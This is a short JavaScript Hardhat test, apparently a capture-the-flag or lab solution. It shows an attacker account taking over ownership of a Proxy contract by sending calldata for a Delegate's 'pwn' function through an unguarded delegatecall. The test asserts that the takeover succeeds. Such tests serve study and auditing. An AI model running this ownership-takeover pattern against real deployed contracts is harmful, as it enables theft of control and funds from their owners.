const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Proxy Contract Delegation Vulnerability", () => {
  let proxy, delegate, attacker;

  beforeEach(async () => {
    const Delegate = await ethers.getContractFactory("Delegate");
    delegate = await Delegate.deploy();
    await delegate.deployed();

    const Proxy = await ethers.getContractFactory("Proxy");
    proxy = await Proxy.deploy(delegate.address);
    await proxy.deployed();

    [, attacker] = await ethers.getSigners();
  });

  it("should allow the owner to be changed via delegatecall", async () => {
    await attacker.sendTransaction({
      to: proxy.address,
      data: delegate.interface.encodeFunctionData("pwn", [])
    });

    expect(await proxy.owner()).to.equal(await attacker.getAddress());
  });
});